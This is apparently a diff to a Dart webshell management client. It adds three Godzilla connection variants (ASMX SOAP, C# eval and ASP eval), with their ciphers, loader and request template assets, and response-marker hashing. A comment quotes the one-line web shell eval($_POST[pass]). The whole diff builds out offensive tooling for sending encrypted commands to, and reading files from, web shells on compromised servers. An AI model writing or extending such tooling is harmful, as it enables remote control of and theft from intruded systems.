@@ -27,6 +27,15 @@ enum GodzillaWire {
   /// `PHP_EVAL_XOR_BASE64` 等 eval 变体：
   /// 每次请求都带一段“装载器源码”，由一句话壳 `eval($_POST[pass])` 执行。
   evalBase64,
+
+  /// `CSHAP_ASMX_AES_BASE64`：请求体是 SOAP XML，不是表单。
+  asmxBase64,
+
+  /// `CSHAP_EVAL_AES_BASE64`：先发一段动态 eval 装载器，再发密文参数。
+  csharpEval,
+
+  /// `ASP_EVAL_BASE64`：连接密码字段放十六进制 eval 装载器，数据放 secretKey。
+  aspEval,
 }
 
 enum GodzillaMarkerStyle {
@@ -203,6 +212,59 @@ enum GodzillaVariant {
     engineAsset: 'data/godzilla/matrix_godzilla.asp.b64',
     readFileMethod: 'readFileContent',
     execMode: GodzillaExecMode.cmdLine,
+  ),
+  csharpAsmxAesBase64(
+    cryptionId: 'CSHAP_ASMX_AES_BASE64',
+    connectorType: 'aspx_godzilla',
+    language: 'aspx',
+    label: 'ASPX-ASMX',
+    cipher: GodzillaCipher.aesCbcKeyIv,
+    markerStyle: GodzillaMarkerStyle.upper16,
+    gzipRequest: false,
+    gunzipResponse: false,
+    wire: GodzillaWire.asmxBase64,
+    requestTemplateAsset:
+        'assets/defaults/payloads/godzilla_shells/asmx_request.xml.tpl',
+    engineAsset: 'data/godzilla/matrix_godzilla.dll.b64',
+    readFileMethod: 'readFile',
+    execMode: GodzillaExecMode.cmdLine,
+  ),
+  csharpEvalAesBase64(
+    cryptionId: 'CSHAP_EVAL_AES_BASE64',
+    connectorType: 'aspx_godzilla',
+    language: 'aspx',
+    label: 'ASPX-EVAL',
+    cipher: GodzillaCipher.aesCbcKeyIv,
+    markerStyle: GodzillaMarkerStyle.upper16,
+    gzipRequest: false,
+    gunzipResponse: false,
+    wire: GodzillaWire.csharpEval,
+    evalLoaderAsset:
+        'assets/defaults/payloads/godzilla_shells/csharp_eval_loader.cs.tpl',
+    markerUsesSecretKey: true,
+    engineAsset: 'data/godzilla/matrix_godzilla.dll.b64',
+    readFileMethod: 'readFile',
+    execMode: GodzillaExecMode.cmdLine,
+  ),
+  aspEvalBase64(
+    cryptionId: 'ASP_EVAL_BASE64',
+    connectorType: 'asp_godzilla',
+    language: 'asp',
+    label: 'ASP-EVAL',
+    cipher: GodzillaCipher.none,
+    markerStyle: GodzillaMarkerStyle.lowerAsp6,
+    gzipRequest: false,
+    gunzipResponse: false,
+    wire: GodzillaWire.aspEval,
+    aspEvalRequestAsset:
+        'assets/defaults/payloads/godzilla_shells/asp_eval_request.vbs.tpl',
+    aspEvalLoaderAsset:
+        'assets/defaults/payloads/godzilla_shells/asp_eval_loader.asp.tpl',
+    markerUsesSecretKey: true,
+    markerKeyUsesDoubleHash: true,
+    engineAsset: 'data/godzilla/matrix_godzilla.asp.b64',
+    readFileMethod: 'readFileContent',
+    execMode: GodzillaExecMode.cmdLine,
   );
 
   const GodzillaVariant({
@@ -216,7 +278,12 @@ enum GodzillaVariant {
     required this.gunzipResponse,
     required this.wire,
     this.evalLoaderAsset,
+    this.requestTemplateAsset,
+    this.aspEvalRequestAsset,
+    this.aspEvalLoaderAsset,
     this.markerPassword,
+    this.markerUsesSecretKey = false,
+    this.markerKeyUsesDoubleHash = false,
     required this.engineAsset,
     required this.readFileMethod,
     required this.execMode,
@@ -243,6 +310,21 @@ enum GodzillaVariant {
 
   /// eval 变体每次请求要发送的装载器模板（`{{PASS}}` 会被替换成 secretKey）。
   final String? evalLoaderAsset;
+
+  /// ASMX 请求 XML 模板（含 `{pass}` / `{data}` 占位符）。
+  final String? requestTemplateAsset;
+
+  /// ASP_EVAL 的十六进制 eval 请求模板（含 `{hexCode}`）。
+  final String? aspEvalRequestAsset;
+
+  /// ASP_EVAL 的 ASP 装载器模板（含 `{pass}` / `{secretKey}` / 标记占位符）。
+  final String? aspEvalLoaderAsset;
+
+  /// 响应标记是否用 `secretKey` 而不是连接密码计算。
+  final bool markerUsesSecretKey;
+
+  /// ASP_EVAL 的标记 key 是 `MD5(MD5(secretKey)[0:16])[0:16]`（上游双重哈希）。
+  final bool markerKeyUsesDoubleHash;
 
   /// 响应标记计算时替代连接密码的固定值。
   ///
